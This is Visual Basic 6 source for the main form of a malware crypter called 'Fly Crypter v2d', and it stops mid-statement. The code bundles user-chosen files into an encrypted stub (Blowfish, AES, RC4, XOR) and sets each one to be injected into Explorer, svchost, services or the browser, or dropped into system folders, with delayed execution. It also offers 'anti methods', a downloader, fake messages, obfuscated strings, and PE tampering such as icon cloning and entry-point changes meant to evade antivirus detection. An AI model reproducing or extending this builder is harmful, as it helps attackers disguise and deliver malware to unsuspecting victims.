VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "mscomctl.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   1470
   ClientLeft      =   5040
   ClientTop       =   5610
   ClientWidth     =   8160
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1470
   ScaleWidth      =   8160
   Begin VB.TextBox rnn 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   6
      Top             =   1680
      Width           =   150
   End
   Begin VB.TextBox rnu 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   5
      Top             =   1680
      Width           =   150
   End
   Begin VB.TextBox rnj 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   4
      Top             =   1680
      Width           =   150
   End
   Begin VB.TextBox rand 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   3
      Top             =   1680
      Width           =   150
   End
   Begin VB.TextBox rn 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   2
      Top             =   1680
      Width           =   150
   End
   Begin VB.PictureBox p2 
      AutoRedraw      =   -1  'True
      Height          =   285
      Left            =   600
      ScaleHeight     =   225
      ScaleWidth      =   255
      TabIndex        =   0
      Top             =   0
      Visible         =   0   'False
      Width           =   315
   End
   Begin MSComctlLib.ImageList il 
      Left            =   0
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      MaskColor       =   12632256
      _Version        =   393216
   End
   Begin MSComctlLib.ListView Lv 
      Height          =   1455
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   8175
      _ExtentX        =   14420
      _ExtentY        =   2566
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      OLEDragMode     =   1
      OLEDropMode     =   1
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      Icons           =   "il"
      SmallIcons      =   "il"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      OLEDragMode     =   1
      OLEDropMode     =   1
      NumItems        =   6
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Name"
         Object.Width           =   2117
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Path"
         Object.Width           =   4762
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Execution"
         Object.Width           =   1940
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Inject/Drop to"
         Object.Width           =   2117
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "Delay"
         Object.Width           =   1940
      EndProperty
      BeginProperty ColumnHeader(6) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   5
         Text            =   "Size"
         Object.Width           =   1371
      EndProperty
   End
   Begin VB.Menu Menu 
      Caption         =   "Menu"
      Visible         =   0   'False
      Begin VB.Menu flop 
         Caption         =   "File options"
         Begin VB.Menu aFL 
            Caption         =   "Add a file"
         End
         Begin VB.Menu rFL 
            Caption         =   "Remove file"
         End
         Begin VB.Menu Clean 
            Caption         =   "Clear files"
         End
      End
      Begin VB.Menu sep2 
         Caption         =   "-"
      End
      Begin VB.Menu mmain 
         Caption         =   "Main options"
         Begin VB.Menu exec 
            Caption         =   "Execution"
            Begin VB.Menu inj 
               Caption         =   "Inject file to"
               Begin VB.Menu injex 
                  Caption         =   "This exe"
               End
               Begin VB.Menu injexpl 
                  Caption         =   "Explorer"
               End
               Begin VB.Menu injsvch 
                  Caption         =   "Svchost"
               End
               Begin VB.Menu injserv 
                  Caption         =   "Services"
               End
               Begin VB.Menu injiexp 
                  Caption         =   "I. Explorer"
               End
               Begin VB.Menu injdefb 
                  Caption         =   "Def.Browser"
               End
            End
            Begin VB.Menu drp 
               Caption         =   "Drop file to"
               Begin VB.Menu drptemp 
                  Caption         =   "Temporary"
               End
               Begin VB.Menu drpsys32 
                  Caption         =   "System32"
               End
               Begin VB.Menu drpwin 
                  Caption         =   "Windows"
               End
               Begin VB.Menu drpappdat 
                  Caption         =   "System"
               End
               Begin VB.Menu drpapppath 
                  Caption         =   "Drivers"
               End
            End
         End
         Begin VB.Menu delayedexec 
            Caption         =   "Delay"
            Begin VB.Menu delm 
               Caption         =   "Custom Delay"
            End
            Begin VB.Menu deln 
               Caption         =   "None"
            End
         End
         Begin VB.Menu manti 
            Caption         =   "Anti methods"
            Checked         =   -1  'True
         End
         Begin VB.Menu downl 
            Caption         =   "Downloader"
         End
         Begin VB.Menu custstub 
            Caption         =   "Custom stub"
         End
         Begin VB.Menu fkmsg 
            Caption         =   "Fake message"
         End
         Begin VB.Menu mneof 
            Caption         =   "Eof data saver"
         End
      End
      Begin VB.Menu pop 
         Caption         =   "Pe options"
         Begin VB.Menu change_icon 
            Caption         =   "Change icon"
         End
         Begin VB.Menu clfl 
            Caption         =   "Clone a file"
         End
         Begin VB.Menu cicon 
            Caption         =   "Clone icon"
         End
         Begin VB.Menu nlpe 
            Caption         =   "Null pe info"
         End
         Begin VB.Menu nullicon 
            Caption         =   "Null pe icon"
         End
         Begin VB.Menu anPADD 
            Caption         =   "Anti padding"
         End
         Begin VB.Menu fixpech 
            Caption         =   "Fix pe checksum"
         End
         Begin VB.Menu chep 
            Caption         =   "Change entry point"
         End
         Begin VB.Menu psec 
            Caption         =   "Add new pe section"
         End
      End
      Begin VB.Menu sep33 
         Caption         =   "-"
      End
      Begin VB.Menu Fcr 
         Caption         =   "Crypt file(s)"
      End
      Begin VB.Menu sep3 
         Caption         =   "-"
      End
      Begin VB.Menu ame 
         Caption         =   "About me"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim fl       As String
Dim blowfish As New cBlowfish
Dim aes      As New cAES
Dim rc4      As New cRc4
Dim Xr       As New cXOR
Dim bufer()  As Byte
Dim Data     As String
Dim Data2    As String
Dim data11   As String
Dim sicon    As String
Dim cstb     As String
Dim scln     As String
Dim sType    As String
Dim x        As String
Dim sDel     As String
Dim mcl      As String
Private Sub ame_Click()
  about.Show
End Sub
Private Function level() As String
  If custom.Option4.Value = True Then
  level = RandomLetter & lRan(RandomNumber) & lRan(RandomNumber)
  End If
  If custom.Option5.Value = True Then
  level = RandomLetter & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber)
  End If
  If custom.Option6.Value = True Then
  level = RandomLetter & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber) & lRan(RandomNumber)
  End If
End Function
Private Sub anPADD_Click()
  If anPADD.Checked = False Then
  anPADD.Checked = True
  Else
  anPADD.Checked = False
  End If
End Sub
Private Sub change_icon_Click()
  fl = ""
  If change_icon.Checked = False Then
  fl = GetFileName(fl, "Icon files(*.ico)|*.ico", "Select a icon file", True)
  If Not fl <> "" Then
  sicon = ""
  Exit Sub
  End If
  sicon = fl
  change_icon.Checked = True
  Else
  sicon = ""
  change_icon.Checked = False
  End If
End Sub
Private Sub chep_Click()
  If chep.Checked = False Then
  chep.Checked = True
  Else
  chep.Checked = False
  End If
End Sub
Private Sub cicon_Click()
  fl = ""
  If cicon.Checked = False Then
  fl = GetFileName(fl, "PE files(*.exe)|*.exe", "Select a file", True)
  If Not fl <> "" Then
  mcl = ""
  Exit Sub
  End If
  mcl = fl
  cicon.Checked = True
  change_icon.Enabled = False
  nullicon.Enabled = False
  Else
  mcl = ""
  cicon.Checked = False
  change_icon.Enabled = True
  nullicon.Enabled = True
  End If
End Sub
Private Sub clfl_Click()
  fl = ""
  If clfl.Checked = False Then
  fl = GetFileName(fl, "PE files(*.exe)|*.exe", "Select a file", True)
  If Not fl <> "" Then
  scln = ""
  Exit Sub
  End If
  scln = fl
  clfl.Checked = True
  nlpe.Enabled = False
  Else
  scln = ""
  clfl.Checked = False
  nlpe.Enabled = True
  End If
End Sub
Private Sub custstub_Click()
  fl = ""
  If custstub.Checked = False Then
  fl = GetFileName(fl, "Any files(*.*)|*.*", "Select a custom stub", True)
  If Not fl <> "" Then
  cstb = ""
  Exit Sub
  End If
  cstb = fl
  custstub.Checked = True
  custom.Show
  Else
  cstb = ""
  custom.Option1.Value = 1
  custom.Option4.Value = 1
  Unload custom
  custstub.Checked = False
  End If
End Sub
Private Sub delm_Click()
  Dim sInput       As String
  If dat = False Then
  If delm.Checked = False Then
  If Lv.SelectedItem.SubItems(4) = "0" Then
  sInput = InputBox("1000 milliseconds = 1 second" & vbNewLine & vbNewLine & "60000 milliseconds = 1 minute" & vbNewLine & vbNewLine & "360000 milliseconds = 1 hour", "Delay in Milliseconds", vbNullString)
  Else
  sInput = InputBox("1000 milliseconds = 1 second" & vbNewLine & vbNewLine & "60000 milliseconds = 1 minute" & vbNewLine & vbNewLine & "360000 milliseconds = 1 hour", "Delay in Milliseconds", Lv.SelectedItem.SubItems(4))
  End If
  If sInput = "" Then Exit Sub
  Lv.SelectedItem.SubItems(4) = sInput
  delm.Checked = 1
  deln.Checked = 0
  Else
  delm.Checked = 0
  deln.Checked = 0
  Lv.SelectedItem.SubItems(4) = "0"
  End If
  End If
End Sub
Private Sub deln_Click()
  Dim sInput       As String
  If dat = False Then
  If deln.Checked = False Then
  Lv.SelectedItem.SubItems(4) = "0"
  delm.Checked = 0
  deln.Checked = 1
  Else
  delm.Checked = 0
  deln.Checked = 0
  Lv.SelectedItem.SubItems(4) = "0"
  End If
  End If
End Sub
Private Sub downl_Click()
  If downl.Checked = False Then
  downloader.Show
  downl.Checked = True
  downloader.Lv.ListItems.clear
  Else
  downloader.Lv.ListItems.clear
  downl.Checked = False
  End If
End Sub
Private Sub drpappdat_Click()
  If dat = False Then
  If drpappdat.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Drop file"
  Lv.SelectedItem.SubItems(3) = "System"
  drpappdat.Checked = True
  inj.Enabled = False
  drptemp.Checked = False
  drpwin.Checked = False
  drpsys32.Checked = False
  drpappdat.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  drpappdat.Checked = False
  inj.Enabled = True
  End If
  End If
End Sub
Private Sub drpapppath_Click()
  If dat = False Then
  If drpapppath.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Drop file"
  Lv.SelectedItem.SubItems(3) = "Drivers"
  drpapppath.Checked = True
  inj.Enabled = False
  drptemp.Checked = False
  drpwin.Checked = False
  drpsys32.Checked = False
  drpappdat.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  drpapppath.Checked = False
  inj.Enabled = True
  End If
  End If
End Sub
Private Sub drpsys32_Click()
  If dat = False Then
  If drpsys32.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Drop file"
  Lv.SelectedItem.SubItems(3) = "System32"
  drpsys32.Checked = True
  inj.Enabled = False
  drptemp.Checked = False
  drpwin.Checked = False
  drpappdat.Checked = False
  drpappdat.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  drpsys32.Checked = False
  inj.Enabled = True
  End If
  End If
End Sub
Private Sub drptemp_Click()
  If dat = False Then
  If drptemp.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Drop file"
  Lv.SelectedItem.SubItems(3) = "Temporary"
  drptemp.Checked = True
  inj.Enabled = False
  drpwin.Checked = False
  drpsys32.Checked = False
  drpappdat.Checked = False
  drpappdat.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  drptemp.Checked = False
  inj.Enabled = True
  End If
  End If
End Sub
Private Sub drpwin_Click()
  If dat = False Then
  If drpwin.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Drop file"
  Lv.SelectedItem.SubItems(3) = "Windows"
  drpwin.Checked = True
  inj.Enabled = False
  drptemp.Checked = False
  drpsys32.Checked = False
  drpappdat.Checked = False
  drpappdat.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  drpwin.Checked = False
  inj.Enabled = True
  End If
  End If
End Sub
Private Sub fixpech_Click()
  If fixpech.Checked = False Then
  fixpech.Checked = True
  Else
  fixpech.Checked = False
  End If
End Sub
Private Sub fkmsg_Click()
  If fkmsg.Checked = False Then
  msg.Show
  fkmsg.Checked = True
  Else
  fkmsg.Checked = False
  End If
End Sub
Private Sub Form_Load()
  cstb = ""
  Me.Caption = drt("DjwApwnrcpt0b--f_aifmslb,mpe")
End Sub
Private Sub Form_Unload(cancel As Integer)
  Unload about
  Unload downloader
  Unload eof
  Unload msg
  Unload section
  Unload custom
  Unload Me
End Sub
Private Sub injdefb_Click()
  If dat = False Then
  If injdefb.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Inject file"
  Lv.SelectedItem.SubItems(3) = "Def. Browser"
  injdefb.Checked = True
  drp.Enabled = False
  injex.Checked = False
  injexpl.Checked = False
  injserv.Checked = False
  injsvch.Checked = False
  injiexp.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  injdefb.Checked = False
  drp.Enabled = True
  End If
  End If
End Sub
Private Sub injex_Click()
  If dat = False Then
  If injex.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Inject file"
  Lv.SelectedItem.SubItems(3) = "This exe"
  injex.Checked = True
  drp.Enabled = False
  injexpl.Checked = False
  injiexp.Checked = False
  injserv.Checked = False
  injsvch.Checked = False
  injdefb.Checked = False
  Else
  injex.Checked = False
  drp.Enabled = True
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  End If
  End If
End Sub
Private Sub injexpl_Click()
  If dat = False Then
  If injexpl.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Inject file"
  Lv.SelectedItem.SubItems(3) = "Explorer"
  injexpl.Checked = True
  drp.Enabled = False
  injex.Checked = False
  injiexp.Checked = False
  injserv.Checked = False
  injsvch.Checked = False
  injdefb.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  injexpl.Checked = False
  drp.Enabled = True
  End If
  End If
End Sub
Private Sub injiexp_Click()
  If dat = False Then
  If injiexp.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Inject file"
  Lv.SelectedItem.SubItems(3) = "I. Explorer"
  injiexp.Checked = True
  drp.Enabled = False
  injex.Checked = False
  injexpl.Checked = False
  injserv.Checked = False
  injsvch.Checked = False
  injdefb.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  injiexp.Checked = False
  drp.Enabled = True
  End If
  End If
End Sub
Private Sub injserv_Click()
  If dat = False Then
  If injserv.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Inject file"
  Lv.SelectedItem.SubItems(3) = "Services"
  injserv.Checked = True
  drp.Enabled = False
  injex.Checked = False
  injiexp.Checked = False
  injexpl.Checked = False
  injsvch.Checked = False
  injdefb.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  injserv.Checked = False
  drp.Enabled = True
  End If
  End If
End Sub
Private Sub injsvch_Click()
  If dat = False Then
  If injsvch.Checked = False Then
  Lv.SelectedItem.SubItems(2) = "Inject file"
  Lv.SelectedItem.SubItems(3) = "Svchost"
  injsvch.Checked = True
  drp.Enabled = False
  injex.Checked = False
  injiexp.Checked = False
  injexpl.Checked = False
  injserv.Checked = False
  injdefb.Checked = False
  Else
  Lv.SelectedItem.SubItems(2) = "-"
  Lv.SelectedItem.SubItems(3) = "-"
  injsvch.Checked = False
  drp.Enabled = True
  End If
  End If
End Sub
Private Sub Lv_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
  Dim sDel() As String
  If dat = False Then
  drptemp.Checked = False
  drpwin.Checked = False
  drpsys32.Checked = False
  drpappdat.Checked = False
  drpapppath.Checked = False
  injex.Checked = False
  injexpl.Checked = False
  injiexp.Checked = False
  injserv.Checked = False
  injsvch.Checked = False
  injdefb.Checked = False
  delm.Checked = False
  deln.Checked = False
  If Lv.SelectedItem.SubItems(2) = "-" Then
  drp.Enabled = True
  inj.Enabled = True
  If Button = 2 Then PopupMenu Menu
  Exit Sub
  End If
  End If
  If Button = 2 Then
  If dat = False Then
  If Lv.SelectedItem.SubItems(2) = "Inject file" Then
  drp.Enabled = False
  inj.Enabled = True
  End If
  If Lv.SelectedItem.SubItems(2) = "Drop file" Then
  inj.Enabled = False
  drp.Enabled = True
  End If
  If Lv.SelectedItem.SubItems(4) = "0" Then deln.Checked = 1
  If Lv.SelectedItem.SubItems(3) = "Temporary" Then drptemp.Checked = True
  If Lv.SelectedItem.SubItems(3) = "System32" Then drpsys32.Checked = True
  If Lv.SelectedItem.SubItems(3) = "Windows" Then drpwin.Checked = True
  If Lv.SelectedItem.SubItems(3) = "System" Then drpappdat.Checked = True
  If Lv.SelectedItem.SubItems(3) = "Drivers" Then drpapppath.Checked = True
  If Lv.SelectedItem.SubItems(3) = "This exe" Then injex.Checked = True
  If Lv.SelectedItem.SubItems(3) = "Explorer" Then injexpl.Checked = True
  If Lv.SelectedItem.SubItems(3) = "Services" Then injserv.Checked = True
  If Lv.SelectedItem.SubItems(3) = "Svchost" Then injsvch.Checked = True
  If Lv.SelectedItem.SubItems(3) = "Def. Browser" Then injdefb.Checked = True
  If Lv.SelectedItem.SubItems(3) = "I. Explorer" Then injiexp.Checked = True
  rFL.Enabled = True
  exec.Enabled = True
  delayedexec.Enabled = True
  Else
  delayedexec.Enabled = False
  exec.Enabled = False
  rFL.Enabled = False
  End If
  If Lv.ListItems.Count > 0 Then
  Fcr.Enabled = True
  mmain.Enabled = True
  pop.Enabled = True
  Clean.Enabled = True
  Else
  Clean.Enabled = False
  pop.Enabled = False
  Fcr.Enabled = False
  mmain.Enabled = False
  End If
  PopupMenu Menu
  End If
End Sub
Private Sub aFL_Click()
  fl = ""
  fl = GetFileName(fl, "All Files .*", "Select a file", True)
  If Not fl <> "" Then Exit Sub
  For i = 1 To Lv.ListItems.Count
  If Lv.ListItems.Item(i).SubItems(1) = fl Then
  Exit Sub
  End If
  Next i
  If Right(fl, 3) = "exe" Then
  With Lv.ListItems.Add(, , GFN(fl), , licc(fl))
  .SubItems(1) = fl
  .SubItems(2) = "Inject file"
  .SubItems(3) = "This exe"
  .SubItems(4) = "0"
  .SubItems(5) = FKB(FileLen(fl))
  End With
  End If
  If Right(fl, 3) <> "exe" Then
  With Lv.ListItems.Add(, , GFN(fl), , licc(fl))
  .SubItems(1) = fl
  .SubItems(2) = "Drop file"
  .SubItems(3) = "Temporary"
  .SubItems(4) = "0"
  .SubItems(5) = FKB(FileLen(fl))
  End With
  End If
  inj.Enabled = False
  drp.Enabled = True
  drptemp.Checked = True
End Sub
Private Sub Lv_OLEDragDrop(Data As MSComctlLib.DataObject, Effect As Long, Button As Integer, Shift As Integer, x As Single, y As Single)
  On Error Resume Next
  For i = 1 To Lv.ListItems.Count
  If Lv.ListItems.Item(i).SubItems(1) = Data.Files(1) Then
  Exit Sub
  End If
  Next i
  If Right(Data.Files(1), 3) = "exe" Then
  With Lv.ListItems.Add(, , GFN(Data.Files(1)), , licc(Data.Files(1)))
  .SubItems(1) = Data.Files(1)
  .SubItems(2) = "Inject file"
  .SubItems(3) = "This exe"
  .SubItems(4) = "0"
  .SubItems(5) = FKB(FileLen(Data.Files(1)))
  End With
  End If
  If Right(Data.Files(1), 3) <> "exe" Then
  With Lv.ListItems.Add(, , GFN(Data.Files(1)), , licc(Data.Files(1)))
  .SubItems(1) = Data.Files(1)
  .SubItems(2) = "Drop file"
  .SubItems(3) = "Temporary"
  .SubItems(4) = "0"
  .SubItems(5) = FKB(FileLen(Data.Files(1)))
  End With
  End If
  inj.Enabled = False
  drp.Enabled = True
  drptemp.Checked = True
End Sub
Private Sub mneof_Click()
  eof.Show
End Sub
Private Sub nlpe_Click()
  If nlpe.Checked = False Then
  nlpe.Checked = True
  clfl.Enabled = False
  Else
  nlpe.Checked = False
  clfl.Enabled = True
  End If
End Sub
Private Sub nullicon_Click()
  If nullicon.Checked = False Then
  nullicon.Checked = True
  change_icon.Enabled = False
  cicon.Enabled = False
  Else
  nullicon.Checked = False
  change_icon.Enabled = True
  cicon.Enabled = True
  End If
End Sub
Private Sub psec_Click()
  If psec.Checked = False Then
  section.Show
  psec.Checked = True
  Else
  psec.Checked = False
  End If
End Sub
Private Sub rFL_Click()
  If dat = False Then
  Lv.ListItems.Remove (Lv.SelectedItem.Index)
  End If
End Sub
Private Sub Clean_Click()
  If Lv.ListItems.Count > 0 Then
  Lv.ListItems.clear
  End If
End Sub
Private Sub manti_click()
  If manti.Checked = False Then
  manti.Checked = True
  Else
  manti.Checked = False
  End If
End Sub
Private Sub fcr_click()
  x = """"
  If cstb = "" Then MsgBox "Please Select your uniq stub!", 16, "Fly Crypter v2d": Exit Sub
  fl = "out"
  fl = GetFileName(fl, "All files(*.*)|*.*", "Select Output File", False)
  If Not fl <> "" Then Exit Sub
  For i = 1 To Lv.ListItems.Count
  If Lv.ListItems.Item(i).SubItems(2) = "-" Then
  MsgBox "Please Select All Files Settings", vbInformation, "Fly Crypter"
  Exit Sub
  End If
  Next i
  If Right(fl, 4) <> ".exe" Then fl = fl & ".exe"
  
  If cstb = "" Then
  bufer = LoadResData(3, "RCDATA")
  Open fl For Binary As #3
  Put #3, , bufer
  Close #3
  Else
  Open fl For Binary As #2
  Put #2, , LoadFile(cstb)
  Close #2
  End If

  bufer = LoadResData(1, "RCDATA")

  Dim iFile As Integer
  iFile = FreeFile
  Call blowfish.DecryptByte(bufer(), "xBydFaB2BVU8ByteUahebAS9zdRD0D")
  Open tmp & "\res.exe" For Binary As #iFile
  Put #iFile, , bufer()
  Close #iFile

  Sleep 500

 
  If custom.Option1.Value = True Then blw
  If custom.Option7.Value = True Then laes
  If custom.Option2.Value = True Then rc
  If custom.Option3.Value = True Then xrn
   
  If nlpe.Checked = True Then
  ShellExecute Me.hWnd, drt("Mncl"), tmp & drt("Zpcq,cvc"), drt("+bcjcrc") & fl & " ," & fl & drt("*TcpqgmlGldm*/*/.11"), 0, 0
  Sleep 700
  End If
   
  If nullicon.Checked = True Then
  ShellExecute Me.hWnd, drt("Mncl"), tmp & drt("Zpcq,cvc"), drt("+bcjcrc") & fl & " ," & fl & drt("*GamlEpmsn*/*."), 0, 0
  Sleep 700
  End If
  
  If cicon.Checked = True Then
  If Dir(tmp & "\tmpicon.ico") <> "" Then Kill tmp & "\tmpicon.ico"
  ExtractIcon mcl, tmp & "\tmpicon.ico"
  Sleep 1000
  ShellExecute Me.hWnd, drt("Mncl"), tmp & drt("Zpcq,cvc"), drt("+_bbmtcpupgrc") & fl & "," & fl & "," & tmp & "\tmpicon(1).ico" & drt("*GAMLEPMSN*/*."), 0, 0
  End If
   
  If Not scln = "" Then
  lCLONE scln, fl
  End If
  
  If fixpech.Checked = True Then
  FixCheckSum fl
  End If
  
  If psec.Checked = True Then
  AddSection fl, section.sname.Text, section.size.Text, section.ch.Text
  End If
  
  If chep.Checked = True Then
  ChangeOEPFromFile fl
  End If

  
  If Not sicon = "" Then
  ShellExecute Me.hWnd, drt("Mncl"), tmp & drt("Zpcq,cvc"), drt("+_bbmtcpupgrc") & fl & "," & fl & "," & sicon & drt("*GAMLEPMSN*/*."), 0, 0
  Else
  If nullicon.Checked = False And cicon.Checked = False Then
  bufer() = LoadResData(2, "RCDATA")
  iFile = FreeFile
  Call blowfish.DecryptByte(bufer(), "63XU5q3SrlrVSxcYj9BipGnBpOJ7iq")
  Open tmp & "\icon.ico" For Binary As #iFile
  Put #iFile, , bufer()
  Close #iFile
  Sleep 500
  ShellExecute Me.hWnd, drt("Mncl"), tmp & drt("Zpcq,cvc"), drt("+_bbmtcpupgrc") & fl & "," & fl & "," & tmp & "\icon.ico" & drt("*GAMLEPMSN*/*."), 0, 0
  End If
  End If
    
  If anPADD.Checked = True Then
  Dim fBuffer() As Byte, rBuffer As String
  Dim IDH As IMAGE_DOS_HEADER
  Dim INH As IMAGE_NT_HEADERS
  Dim ISH As IMAGE_SECTION_HEADER
  Open fl For Binary As #1
  rBuffer = Space(LOF(1))
  Get #1, , rBuffer
  fBuffer = StrConv(rBuffer, vbFromUnicode)
  CopyMemory IDH, fBuffer(0), Len(IDH)
  CopyMemory INH, fBuffer(IDH.e_lfanew), Len(INH)
  CopyMemory ISH, fBuffer(IDH.e_lfanew + Len(INH) + Len(ISH) * (INH.FileHeader.NumberOfSections - 1)), Len(ISH)
  rBuffer = String(ISH.SizeOfRawData - ISH.VirtualSize, 0)
  Seek #1, ISH.PointerToRawData + ISH.VirtualSize + 1
  Put #1, , rBuffer
  Close #1
  End If
  
  Sleep 1000
  
  rn.Text = ""
  Data = ""
  If downl.Checked = True Then
  Kill tmp & "\tmp.html"
  Kill tmp & "\script3.ini"
  End If
  Kill tmp & "\script.ini"
  Kill tmp & "\script2.ini"
  Kill tmp & "\sc2.txt"
  Kill tmp & "\res.ini"
  Kill tmp & "\res.log"
  If Dir(tmp & "\icon.ico") <> "" Then Kill tmp & "\icon.ico"
  If Dir(tmp & "\tmpicon.ico") <> "" Then Kill tmp & "\tmpicon.ico"
  If Dir(tmp & "\tmpicon(1).ico") <> "" Then Kill tmp & "\tmpicon(1).ico"
  Kill tmp & "\res.exe"
  MsgBox "Done!", vbInformation, "Fly Crypter v2d"
End Sub
Private Function xrn()
  x = """"

  rn.Text = ""
  rnj.Text = ""
  rnu.Text = ""
  rnn.Text = ""
  
  For i = 1 To Lv.ListItems.Count
  rn.Text = level
  rnj.Text = lRan(RandomNumber)
  rnu.Text = lRan(RandomNumber)
  rnn.Text = lRan(RandomNumber)
  Data = Data & custom.l1.Text & Xr.EncryptString(Lv.ListItems.Item(i).SubItems(2), rnj.Text) & custom.l2.Text & rnj.Text & custom.l2.Text & _
  Xr.EncryptString(Lv.ListItems.Item(i).SubItems(3), rnu.Text) & custom.l2.Text & rnu.Text & custom.l2.Text & _
  Xr.EncryptString(LoadFile(Lv.ListItems.Item(i).SubItems(1)), rn.Text) & custom.l2.Text & rn.Text & custom.l2.Text & _
  Xr.EncryptString("\" & Lv.ListItems(i).Text, rnn.Text) & custom.l2.Text & rnn.Text & custom.l2.Text & Lv.ListItems.Item(i).SubItems(4) & custom.l2.Text
  Next i
  
  Open tmp & "\script.ini" For Binary As #7
  Put #7, , Data
  Close #7
  
  
  data11 = ""

  If manti.Checked = True Then
  data11 = custom.l1.Text & "1"
  Else
  data11 = custom.l1.Text & "."
  End If
  
  If fkmsg.Checked = True Then
  rnu.Text = ""
  rn.Text = ""
  rnu.Text = lRan(RandomNumber)
  rn.Text = lRan(RandomNumber)
  sType = ""
  If msg.Combo2.Text = "Ok" Then sType = 0
  If msg.Combo2.Text = "Ok,Cancel" Then sType = 1
  If msg.Combo2.Text = "Retry,Cancel" Then sType = 5
  If msg.Combo2.Text = "Yes,No" Then sType = 4
  If msg.Combo2.Text = "Yes,No,Cancel" Then sType = 3
  If msg.Combo2.Text = "Abort,Retry,Ignore" Then sType = 2
  If msg.Combo1.Text = "None" Then sType = sType + 0
  If msg.Combo1.Text = "Critical" Then sType = sType + 16
  If msg.Combo1.Text = "Question" Then sType = sType + 32
  If msg.Combo1.Text = "Exclamation" Then sType = sType + 48
  If msg.Combo1.Text = "Information" Then sType = sType + 64
   
  data11 = data11 & custom.l1.Text & sType & custom.l1.Text & _
  Xr.EncryptString(msg.b.Text, rnu.Text) & custom.l1.Text & rnu.Text & custom.l1.Text & _
  Xr.EncryptString(msg.t.Text, rn.Text) & custom.l1.Text & rn.Text & custom.l1.Text
  Else
  data11 = data11 & custom.l1.Text & "." & custom.l1.Text _
  & "." & custom.l1.Text & rnu.Text & custom.l1.Text & "." & custom.l1.Text & rn.Text & custom.l1.Text
  '6
  End If
  
  If downl.Checked = True Then
  data11 = data11 & "1" & custom.l1.Text '7
  Else
  data11 = data11 & "." & custom.l1.Text
  End If
   
  Open tmp & "\script2.ini" For Binary As #5
  Put #5, , data11
  Close #5
  
  Open tmp & "\sc2.txt" For Output As #6
  Print #6, "[FILENAMES]"
  Print #6, "EXE = " & fl
  Print #6, "SaveAs = " & fl & vbCrLf
  Print #6, "[COMMANDS]"
  Print #6, "-addoverwrite " & tmp & "\script.ini," & x & "STB" & x & "," & x & "1" & x & ",1033"
  Print #6, "-addoverwrite " & tmp & "\script2.ini," & x & "STB" & x & "," & x & "2" & x & ",1033"
 
  If downl.Checked = True Then
  rand.Text = ""
  rnu.Text = ""
  rnn.Text = ""
  For N = 1 To downloader.Lv.ListItems.Count
  rand.Text = lRan(RandomNumber) & lRan(RandomNumber)
  rnu.Text = lRan(RandomNumber)
  rnn.Text = lRan(RandomNumber)
  Data2 = Data2 & custom.l1.Text & Xr.EncryptString(downloader.Lv.ListItems.Item(N).SubItems(1), rnu.Text) & custom.l2.Text & rnu.Text & custom.l2.Text & _
